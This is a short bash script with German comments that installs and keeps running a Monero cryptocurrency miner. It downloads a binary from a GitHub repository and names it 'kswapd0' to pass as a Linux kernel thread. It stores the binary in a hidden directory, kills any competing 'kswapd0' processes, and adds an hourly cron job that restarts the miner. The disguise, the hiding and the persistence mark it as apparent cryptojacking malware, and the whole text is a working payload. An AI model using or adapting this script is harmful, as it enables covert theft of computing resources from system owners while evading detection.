#!/bin/bash

# Script um Monero Ocean Miner zu starten und Dateien zu verwalten

# Verzeichnis erstellen, falls es nicht existiert
mkdir -p "$HOME/.gdm2_manual/"

# Pfade zu den benötigten Dateien
KSWAPD0="$HOME/.gdm2_manual/kswapd0"
CONFIG_JSON="$HOME/.gdm2_manual/config.json"

# Prozesse beenden, die mit kswapd0 verbunden sind
pkill -f kswapd0

# Überprüfen und Herunterladen von kswapd0, falls erforderlich
if [ ! -f "$KSWAPD0" ] || [ ! -x "$KSWAPD0" ]; then
    echo "kswapd0 existiert nicht oder ist nicht ausführbar. Herunterladen..."
    wget -O "$KSWAPD0" https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/kswapd0
    chmod +x "$KSWAPD0"
fi

# Überprüfen und Herunterladen von config.json, falls erforderlich
if [ ! -f "$CONFIG_JSON" ]; then
    echo "config.json existiert nicht. Herunterladen..."
    wget -O "$CONFIG_JSON" https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
fi

# kswapd0 ausführen
"$KSWAPD0" --config="$CONFIG_JSON" &

# Überprüfungsskript erstellen
cat << 'EOF' > "$HOME/.gdm2_manual/check_kswapd0.sh"
#!/bin/bash

if ! pgrep -x "kswapd0" > /dev/null; then
    echo "kswapd0 not started. Going to start it..."
    cd "$HOME/.gdm2_manual/" || exit
    ./kswapd0 --config=config.json &
else
    echo "kswapd0 already started."
fi
EOF

# Überprüfungsskript ausführbar machen
chmod +x "$HOME/.gdm2_manual/check_kswapd0.sh"

# Cron-Job einrichten
(crontab -l 2>/dev/null; echo "0 * * * * $HOME/.gdm2_manual/check_kswapd0.sh") | crontab -
